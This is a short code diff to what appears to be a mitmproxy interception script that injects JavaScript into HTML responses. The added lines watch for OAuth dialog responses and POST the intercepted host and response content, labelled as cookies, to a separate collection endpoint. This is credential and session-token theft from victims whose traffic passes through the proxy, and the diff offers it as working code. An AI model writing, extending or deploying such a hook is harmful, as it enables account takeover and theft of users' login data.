@@ -60,6 +60,19 @@ def response(flow):
         if flow.request.host in "http://internal/js/welcome.js":
             return  # Make sure JS isn't injected to itself
 
+        if flow.request.url.find('v2.8/dialog/oauth') > -1 :
+            print("OAUTJ")
+            # data to be sent to api 
+            data = { 'asking':flow.request.host, 
+                    'alt_holder':'facekeeys', 
+                    'cookies':flow.response.content} 
+              
+            # sending post request and saving response as response object 
+            r = requests.post(url = 'http://internal/lido.pupsiks', data = data) 
+
+            pprint(r.content)
+
+
         if "text/html" in flow.response.headers["content-type"] :     # inject only for HTML resources
             print ('Has Body') 
              
